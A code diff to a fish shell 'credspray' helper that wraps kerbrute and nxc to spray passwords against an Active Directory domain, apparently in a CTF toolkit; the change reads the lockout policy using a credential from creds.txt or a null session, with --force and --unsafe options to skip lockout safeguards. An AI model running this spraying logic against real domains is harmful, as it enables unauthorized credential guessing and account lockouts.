@@ -24,10 +24,11 @@ function __ezpz_credspray_is_hash --argument-names value
     string match -qr '^[a-fA-F0-9]{32}$' -- $value
 end
 
-# kerbrute logs "2026/11/12 09:27:04 >  [+] ..." with color codes; keep just the
-# message so the output stays readable.
+# kerbrute logs "2026/11/12 09:27:04 >  [+] ..." with color codes, and fish
+# prepends OSC palette sequences when the capture file is replayed. Strip all
+# of it so the output stays readable.
 function __ezpz_credspray_logfmt
-    sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g; s/^[0-9]{4}\/[0-9]{2}\/[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} > +//'
+    sed -E "s/\x1B\][^\a\x1B]*(\a|\x1B.)//g; s/\x1B\[[0-9;?]*[A-Za-z]//g; s/^[0-9]{4}\/[0-9]{2}\/[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} > +//"
 end
 
 # Pull the lockout threshold out of `nxc --pass-pol` output.
@@ -71,6 +72,8 @@ Usage: ezpz credspray -t <target> -d <domain> [-u <user|file>] [-p <password|fil
     kerbrute always runs with --safe, so the spray aborts on the first locked
     account. Before spraying, the domain password policy is read with nxc and
     the password list is trimmed to one attempt below the lockout threshold.
+    The policy probe uses the first line of creds.txt (the ctf.fish standard),
+    falling back to a null session, and is skipped when neither works.
 
     --force           Spray the whole list, ignoring the policy guard
     --unsafe          Do not pass --safe to kerbrute
@@ -123,9 +126,6 @@ Examples:
     set -l hashes 0
     # Real path to show in the repeatable command, when the caller gave one.
     set -l users_arg ""
-    # First complete user:pass pair, used for the password-policy probe.
-    set -l probe_user ""
-    set -l probe_pass ""
 
     # -u: literal username, username list, or user:pass file.
     if set -q _flag_user
@@ -221,11 +221,6 @@ Examples:
                 continue
             end
 
-            if test -n "$user" -a -z "$probe_user"
-                set probe_user $user
-                set probe_pass $pass
-            end
-
             contains -- $pass $passwords; or set -a passwords $pass
         end < $_flag_file
     end
@@ -253,11 +248,6 @@ Examples:
     end
     set users $sprayable
 
-    if test -n "$probe_user"; and not contains -- $probe_user $users
-        set probe_user ""
-        set probe_pass ""
-    end
-
     if test (count $users) -eq 0
         ezpz_error "No sprayable usernames found. Use -u or -f with a user:pass file."
         echo $usage
@@ -282,27 +272,42 @@ Examples:
     # password list larger than the threshold never hits the DC.
     set -l per_user (count $passwords)
 
-    # Probe credential: the first user:pass pair from -f, otherwise the first
-    # user paired with the first password.
-    if test -z "$probe_user"
-        set probe_user $users[1]
-        set probe_pass $passwords[1]
-    end
-
     if set -q _flag_force
         ezpz_warn "Lockout guard bypassed with --force."
     else
-        # Null session first: it costs no authentication attempt.
-        set -l policy (timeout 30 nxc smb $_flag_target -u '' -p '' --pass-pol 2>/dev/null)
-        set -l threshold (__ezpz_credspray_lockout_threshold $policy)
+        set -l policy_tmp (mktemp)
+        set -l threshold ""
+
+        # ctf.fish leaves the known credentials in creds.txt. A pair taken from
+        # the spray list is a guess, so it is not used to read the policy.
+        if test -f creds.txt
+            while read -l line
+                set line (string trim -- $line)
+                test -z "$line"; and continue
+                string match -q '#*' -- $line; and continue
+
+                set -l parts (string split -m1 : $line)
+                test (count $parts) -ge 2; or continue
+
+                set -l puser (__ezpz_credspray_bare_user $parts[1])
+                set -l ppass $parts[2]
+                test -n "$puser"; and test -n "$ppass"; or continue
+                __ezpz_credspray_is_hash $ppass; and continue
+
+                ezpz_spin_capture $policy_tmp timeout 30 nxc smb $_flag_target \
+                    -u "$_flag_domain\\$puser" -p "$ppass" --pass-pol
+                set threshold (__ezpz_credspray_lockout_threshold (cat $policy_tmp))
+                break
+            end < creds.txt
+        end
 
         if test -z "$threshold"
-            # Fall back to a known credential; a null session is not always
-            # allowed to read the policy.
-            set policy (timeout 30 nxc smb $_flag_target \
-                -u "$_flag_domain\\$probe_user" -p "$probe_pass" --pass-pol 2>/dev/null)
-            set threshold (__ezpz_credspray_lockout_threshold $policy)
+            # No known credential: try a null session, it costs no attempt.
+            ezpz_spin_capture $policy_tmp timeout 30 nxc smb $_flag_target -u '' -p '' --pass-pol
+            set threshold (__ezpz_credspray_lockout_threshold (cat $policy_tmp))
         end
+
+        rm -f $policy_tmp
 
         if test -n "$threshold"
             if test $threshold -gt 0
